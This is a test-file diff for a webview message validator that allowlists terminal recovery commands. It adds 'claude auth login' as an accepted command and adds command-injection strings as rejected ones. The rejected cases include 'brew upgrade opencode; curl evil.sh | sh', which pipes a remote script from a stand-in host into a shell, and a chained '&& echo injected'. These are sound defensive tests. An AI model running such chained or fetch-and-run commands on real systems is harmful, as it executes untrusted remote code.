@@ -522,6 +522,7 @@ describe('webview message validation', () => {
     'bun add -g opencode-ai@latest',
     'brew upgrade opencode',
     'curl -fsSL https://opencode.ai/install | bash',
+    'claude auth login',
   ])('accepts the recovery command %s', (command) => {
     expect(parseWebviewMessage({ type: 'terminal/run', payload: { command } })).toEqual({
       type: 'terminal/run',
@@ -535,6 +536,8 @@ describe('webview message validation', () => {
       'brew upgrade opencode; curl evil.sh | sh',
       'npm i -g opencode-ai ',
       'echo hi',
+      'claude auth login && echo injected',
+      'claude auth login --token secret',
     ]) {
       expect(parseWebviewMessage({ type: 'terminal/run', payload: { command } })).toBeNull();
     }
